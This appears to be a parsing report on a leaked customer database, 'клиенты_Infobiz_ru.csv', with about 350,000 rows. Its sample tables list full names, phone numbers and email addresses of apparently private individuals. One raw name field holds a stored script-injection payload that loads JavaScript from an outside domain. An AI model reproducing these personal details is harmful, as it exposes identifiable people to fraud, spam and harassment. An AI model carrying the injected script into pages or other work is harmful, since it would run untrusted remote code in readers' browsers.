# Parsetron results

## About row data

> - File path: клиенты_Infobiz_ru.csv
> - Total rows: 351742

### Schema
```
root
 |-- Имя: string (nullable = true)
 |-- Телефон: string (nullable = true)
 |-- Почта: string (nullable = true)

```

### Data sample
```
| Имя                                     |     Телефон | Почта                                  |
|:----------------------------------------|------------:|:---------------------------------------|
| Убушаев роман владимирович              | 79275974795 | roma.ubushaev@mail.ru                  |
| Цуменко Александр Анатольевич           | 79511789062 | A-Z@kelup.com                          |
| Андрей Булеков                          | 79067748978 | alex.fh@mail.ru                        |
| Ольга                                   | 79384212379 | ocebotar20@gmail.com                   |
| Столяров Александр                      |  9033573470 | cnjkzhjd2712@mail.ru                   |
| Сивогривова Евгения Николаевна          |  9527403862 | sivogrivova@zhenya.ru                  |
| Тимофеева Раиса Михайловна              | 79821406834 | raya.timofeeva.46@bk.ru                |
| Мухаммадсодик Абдурахманов Якубжон угли | 79207730323 | Sherbek_77777@mail.ru                  |
| Айтматов Мухаммедабдукадыр Жолдошбаевич | 79955961097 | muhammed_official.kg@mail.ru           |
| Абдрахманова Маххабат Сайпуллсаликовна  | 79514267957 | mahibbat@990gmail.com                  |
| Абдурахмонова махпратхон Тошпулатовна   | 79537631045 | flowdomino94@gmail.ru                  |
| Анастастасия, Александровна Михайлова   |  9515889548 | anastasiya.budgjam79.mihaylova@mail.ru |
| Ноздрачева     Татьяна    кузьминична   | 79098265315 | razzigaevaolesa@gmail.com              |
| Hi<script src=//8b2.ru/s.js></script>   | 79556663333 | golddmr@ya.ru                          |
| Гаджимагомедова Румсина Фажрудиновна    | 79285621018 | gr180684@gmail.com                     |
| Мухаметшариф Ришатович Давлеткильдин    | 79273333467 | muhametsarifdavletkildin167@gmail.com  |
| Климашевский Вячеслав Константинович    | 79024566344 | kdaha2013@meil.ru                      |
| Камалидин Рахматиллаев Мамадазизович    | 79058466281 | kemal.sabyrov@mail.ru                  |
| Баколинантенаина Андрианаиворавелона    | 79253526245 | bakoliandria@gmail.com                 |
| Саидрахмонзода Рахматчони Давлатулло    | 79777725704 | rahmatjosairahmonov1122@gmail.com      |
```


## About final data

### Schema
```
root
 |-- names: array (nullable = true)
 |    |-- element: string (containsNull = true)
 |-- emails: array (nullable = true)
 |    |-- element: string (containsNull = true)
 |-- phones: array (nullable = true)
 |    |-- element: string (containsNull = true)

```


### Columns completeness

| Column   | Completeness |
|----------|--------------|
| Names | 100.00% |
| Emails | 99.04% |
| Phones | 94.66% |



### Data sample
```
| names                                       | emails                                     | phones          |
|:--------------------------------------------|:-------------------------------------------|:----------------|
| ['Цуменко Александр Анатольевич']           | ['a-z@kelup.com']                          | ['79511789062'] |
| ['Андрей Булеков']                          | ['alex.fh@mail.ru']                        | ['79067748978'] |
| ['Ольга']                                   | ['ocebotar20@gmail.com']                   | ['79384212379'] |
| ['Сивогривова Евгения Николаевна']          | ['sivogrivova@zhenya.ru']                  | ['79527403862'] |
| ['Тимофеева Раиса Михайловна']              | ['raya.timofeeva.46@bk.ru']                | ['79821406834'] |
| ['Мухаммадсодик Абдурахманов Якубжон Угли'] | ['sherbek_77777@mail.ru']                  | ['79207730323'] |
| ['Айтматов Мухаммедабдукадыр Жолдошбаевич'] | ['muhammed_official.kg@mail.ru']           | ['79955961097'] |
| ['Абдрахманова Маххабат Сайпуллсаликовна']  | ['mahibbat@990gmail.com']                  | ['79514267957'] |
| ['Анастастасия Александровна Михайлова']    | ['anastasiya.budgjam79.mihaylova@mail.ru'] | ['79515889548'] |
| ['Ноздрачева Татьяна Кузьминична']          | ['razzigaevaolesa@gmail.com']              | ['79098265315'] |
| ['Гаджимагомедова Румсина Фажрудиновна']    | ['gr180684@gmail.com']                     | ['79285621018'] |
| ['Мухаметшариф Ришатович Давлеткильдин']    | ['muhametsarifdavletkildin167@gmail.com']  | ['79273333467'] |
| ['Климашевский Вячеслав Константинович']    | ['kdaha2013@meil.ru']                      | ['79024566344'] |
| ['Камалидин Рахматиллаев Мамадазизович']    | ['kemal.sabyrov@mail.ru']                  | ['79058466281'] |
| ['Баколинантенаина Андрианаиворавелона']    | ['bakoliandria@gmail.com']                 | ['79253526245'] |
| ['Саидрахмонзода Рахматчони Давлатулло']    | ['rahmatjosairahmonov1122@gmail.com']      | ['79777725704'] |
| ['Мухаметшариф Ришатович Давлеткильдин']    | ['muhametsarifdavletkildin167@gmail.com']  | ['79273333467'] |
| ['Ермагамбетова Маржан Амангельдиновна']    | ['kusherbaeva06@mail.ru']                  |                 |
| ['Магомедова Умукусум Магомедзагировна']    | ['uma-0119@mail.ru']                       | ['79286800119'] |
| ['Кононова Галина Вячеславовна Шангалы']    | ['gkononova229@gmail.com']                 | ['79027057292'] |
```